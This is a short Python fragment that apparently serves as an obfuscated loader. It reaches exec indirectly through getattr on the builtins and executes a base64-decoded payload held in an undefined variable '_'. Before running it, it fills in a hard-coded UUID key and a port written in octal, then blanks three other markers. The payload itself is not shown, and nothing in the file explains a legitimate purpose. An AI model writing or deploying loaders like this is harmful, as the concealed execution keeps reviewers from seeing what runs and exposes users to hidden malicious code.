import sys
from base64 import b64decode

sys.__std__ = __builtins__
__builtins__.getattr(sys.__std__, "exec")(
    b64decode(_).decode("utf8").replace(str(int("0o17620", 8)), str(8080))
    .replace("__key__", "33d71f39-84ae-41fe-aade-ddc52ce9dc10")
    .replace("__vl__", "")
    .replace("__vm__", "")
    .replace("__tr__", "")
)